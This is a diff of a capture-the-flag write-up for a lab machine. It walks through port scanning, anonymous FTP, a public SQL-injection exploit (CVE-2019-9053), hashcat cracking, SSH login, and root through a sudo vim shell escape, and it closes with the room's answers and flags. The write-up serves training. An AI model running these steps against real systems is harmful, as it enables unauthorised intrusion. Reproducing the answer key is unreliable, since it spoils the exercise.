@@ -6,15 +6,15 @@ No summary present 😢
 
 
 ## (----------RECON----------)
-Target IP Address: 10.10.231.22
-Attack Box IP Address: 10.10.97.62
+Target IP Address: 10.10.48.157
+Attack Box IP Address: 10.10.255.174
 test update
-webserver: http://10.10.231.22:80
+webserver: http://10.10.48.157:80
 
 ## (----------SCANNING---------)
 
 #### Port Scan Results
-Nmap scan report for 10.10.231.22
+Nmap scan report for 10.10.48.157
 Host is up (0.00066s latency).
 Not shown: 997 filtered ports
 PORT     STATE SERVICE VERSION
@@ -24,7 +24,7 @@ PORT     STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:10.10.97.62
+|      Connected to ::ffff:10.10.255.174
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -57,7 +57,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 #### Trace Route Results
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.66 ms 10.10.231.22
+1   0.66 ms 10.10.48.157
 
 #### Open Ports Identified 
 OPEN PORTS: 
@@ -71,12 +71,12 @@ OPEN PORTS:
 Investigating the FTP server we see Anonymous FTP login allowed
 Logging in with:
 ```plaintext
-ftp 10.10.231.22
+ftp 10.10.48.157
 ```
 Results:
-Connected to 10.10.231.22.
+Connected to 10.10.48.157.
 220 (vsFTPd 3.0.3)
-Name (10.10.231.22:root):
+Name (10.10.48.157:root):
 
 Providing the username: anonymous
 230 Login successful.
@@ -110,7 +110,7 @@ This identifies potential weak passwords on the host
 
 fuzzing directories:
 ```plaintext
-dirb http://10.10.231.22/80 common.txt
+dirb http://10.10.48.157/80 common.txt
 ```
 
 ### directory results: 
@@ -121,62 +121,62 @@ By The Dark Raver
 -----------------
 
 START_TIME: Sun Feb 16 17:07:34 2025
-URL_BASE: http://10.10.231.22:80/
+URL_BASE: http://10.10.48.157:80/
 WORDLIST_FILES: common.txt
 
 -----------------
 
 GENERATED WORDS: 1942                                                          
 
----- Scanning URL: http://10.10.231.22:80/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/                                       
----- Entering directory: http://10.10.231.22:80/simple/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/admin/                            
-==> DIRECTORY: http://10.10.231.22:80/simple/assets/                           
-==> DIRECTORY: http://10.10.231.22:80/simple/doc/                              
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/                              
-==> DIRECTORY: http://10.10.231.22:80/simple/modules/                          
-==> DIRECTORY: http://10.10.231.22:80/simple/tmp/                              
-==> DIRECTORY: http://10.10.231.22:80/simple/uploads/                               
----- Entering directory: http://10.10.231.22:80/simple/admin/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/admin/lang/                       
-==> DIRECTORY: http://10.10.231.22:80/simple/admin/plugins/                    
-==> DIRECTORY: http://10.10.231.22:80/simple/admin/templates/                  
-==> DIRECTORY: http://10.10.231.22:80/simple/admin/themes/                        
----- Entering directory: http://10.10.231.22:80/simple/assets/ ----
+---- Scanning URL: http://10.10.48.157:80/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/                                       
+---- Entering directory: http://10.10.48.157:80/simple/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/admin/                            
+==> DIRECTORY: http://10.10.48.157:80/simple/assets/                           
+==> DIRECTORY: http://10.10.48.157:80/simple/doc/                              
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/                              
+==> DIRECTORY: http://10.10.48.157:80/simple/modules/                          
+==> DIRECTORY: http://10.10.48.157:80/simple/tmp/                              
+==> DIRECTORY: http://10.10.48.157:80/simple/uploads/                               
+---- Entering directory: http://10.10.48.157:80/simple/admin/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/admin/lang/                       
+==> DIRECTORY: http://10.10.48.157:80/simple/admin/plugins/                    
+==> DIRECTORY: http://10.10.48.157:80/simple/admin/templates/                  
+==> DIRECTORY: http://10.10.48.157:80/simple/admin/themes/                        
+---- Entering directory: http://10.10.48.157:80/simple/assets/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)     
----- Entering directory: http://10.10.231.22:80/simple/doc/ ----    
----- Entering directory: http://10.10.231.22:80/simple/lib/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/assets/                       
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/classes/                      
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/lang/                         
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/plugins/                           
----- Entering directory: http://10.10.231.22:80/simple/modules/ ----
+---- Entering directory: http://10.10.48.157:80/simple/doc/ ----    
+---- Entering directory: http://10.10.48.157:80/simple/lib/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/assets/                       
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/classes/                      
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/lang/                         
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/plugins/                           
+---- Entering directory: http://10.10.48.157:80/simple/modules/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)     
----- Entering directory: http://10.10.231.22:80/simple/tmp/ ----
+---- Entering directory: http://10.10.48.157:80/simple/tmp/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)     
----- Entering directory: http://10.10.231.22:80/simple/uploads/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/uploads/images/                        
----- Entering directory: http://10.10.231.22:80/simple/admin/lang/ ----     
----- Entering directory: http://10.10.231.22:80/simple/admin/plugins/ ----     
----- Entering directory: http://10.10.231.22:80/simple/admin/templates/ ----     
----- Entering directory: http://10.10.231.22:80/simple/admin/themes/ ----
+---- Entering directory: http://10.10.48.157:80/simple/uploads/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/uploads/images/                        
+---- Entering directory: http://10.10.48.157:80/simple/admin/lang/ ----     
+---- Entering directory: http://10.10.48.157:80/simple/admin/plugins/ ----     
+---- Entering directory: http://10.10.48.157:80/simple/admin/templates/ ----     
+---- Entering directory: http://10.10.48.157:80/simple/admin/themes/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)   
----- Entering directory: http://10.10.231.22:80/simple/lib/assets/ ----
+---- Entering directory: http://10.10.48.157:80/simple/lib/assets/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)    
----- Entering directory: http://10.10.231.22:80/simple/lib/classes/ ----
-==> DIRECTORY: http://10.10.231.22:80/simple/lib/classes/internal/                
----- Entering directory: http://10.10.231.22:80/simple/lib/lang/ ----
+---- Entering directory: http://10.10.48.157:80/simple/lib/classes/ ----
+==> DIRECTORY: http://10.10.48.157:80/simple/lib/classes/internal/                
+---- Entering directory: http://10.10.48.157:80/simple/lib/lang/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)    
----- Entering directory: http://10.10.231.22:80/simple/lib/plugins/ ----    
----- Entering directory: http://10.10.231.22:80/simple/uploads/images/ ----    
----- Entering directory: http://10.10.231.22:80/simple/lib/classes/internal/ ----
+---- Entering directory: http://10.10.48.157:80/simple/lib/plugins/ ----    
+---- Entering directory: http://10.10.48.157:80/simple/uploads/images/ ----    
+---- Entering directory: http://10.10.48.157:80/simple/lib/classes/internal/ ----
 
 -----------------
 END_TIME: Sun Feb 16 17:07:51 2025
@@ -205,7 +205,7 @@ Identified the script required python 2
 
 further to execute this exploit using the following command:
 ```plaintext
-python 46635.py -u http://10.10.231.22/simple
+python 46635.py -u http://10.10.48.157/simple
 ```
 
 this script will then attempt to identify the following
@@ -219,41 +219,24 @@ this will require cracking using the following command:
 hash type identified: |20|md5(\$salt.$pass)|
 
 ```bash
-hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2DDD
+hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --force
 ```
 
 Cracking the password (also providing the bypass flag) presented the following results:
 
-Session..........: hashcat                                
-Status...........: Bypass
-Hash.Mode........: 20 (md5($salt.$pass))
-Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2DDD
-Time.Started.....: Mon Feb 17 11:12:28 2025 (2 secs)
-Time.Estimated...: Mon Feb 17 11:12:31 2025 (1 sec)
-Kernel.Feature...: Optimized Kernel
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:  5040.8 kH/s (0.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
-Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
-Progress.........: 8775408/14344385 (61.18%)
-Rejected.........: 1776/8775408 (0.02%)
-Restore.Point....: 8775408/14344385 (61.18%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidate.Engine.: Device Generator
-Candidates.#1....: dari22232822 -> danslover1
-Hardware.Mon.#1..: Temp: 45c Util: 57%
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
 
-Password Identified: "danslover1"
+Password Identified: "secret"
 
 ### file results
 
 ```bash
-dirb http://10.10.231.22:80 -x ext.txt
+dirb http://10.10.48.157:80 -x ext.txt
 ```
 
----- Scanning URL: http://10.10.231.22:80/ ----
-+ http://10.10.231.22:80/index.html (CODE:200|SIZE:11321)                                           
-+ http://10.10.231.22:80/robots.txt (CODE:200|SIZE:929)          
+---- Scanning URL: http://10.10.48.157:80/ ----
++ http://10.10.48.157:80/index.html (CODE:200|SIZE:11321)                                           
++ http://10.10.48.157:80/robots.txt (CODE:200|SIZE:929)          
 
 
 investigating the contents of robots.txt shows the following:
@@ -297,5 +280,82 @@ Disallow: /openemr-5_0_1_3
 
 ## (----------EXPLOITATION----------)
 
+upon gathering the users credentials 
+that was also confirmed to be utilised throughout the system we have gathered the following:
+
+Username: mitch
+Email: admin@admin.com
+Password: secret
+
+now we can SSH into the server utilising the following command:
+(note that ssh is not running on a standard port that being 22 we now know it is running on port 2222)
+
+```bash
+ssh -p 2222 mitch@10.10.48.157 
+```
+
+asking for the password we provide: "secret
+
+
+## (-------Privilege Escalation------)
+
+best practice when attempting to elevate privileges is to identify what 
+commands can be executed with sudo
+
+```bash
+sudo -l
+```
+
+results:
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+vim has been identified as an application that can be executed with sudo
+
+researching GTFObins which is:
+GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
+
+The project collects legitimate functions of Unix binaries that can be abused to get the fuck break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+
+Searching for "VIM" under the sudo "tab" we have identified the following command that can be used to break out of the restricted shell we are currently in
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+this will glitch out the vim editor and elevate privileges to root
+
+
+# ROOT ACCESS ACHIEVED
 
 ## (----------RESULTS-----------)
+
+Question: How many services are running under port 1000?
+Answer: 2
+
+Question: What is running on the higher port?
+Answer: ssh
+
+Question: What's the CVE you're using against the application?
+Answer: CVE-2019-9053
+
+Question: To what kind of vulnerability is the application vulnerable?
+Answer: sqli
+
+Question: What's the password?
+Answer: secret
+
+Question: Where can you login with the details obtained?
+Answer: ssh
+
+Question: What's the user flag?
+Answer: G00d j0b, keep up!
+
+Question: Is there any other user in the home directory? What's its name?
+Answer: sunbath
+
+Question: What can you leverage to spawn a privileged shell?
+Answer: vim
+
+Question: What's the root flag?
+Answer: W3ll d0n3. You made it!
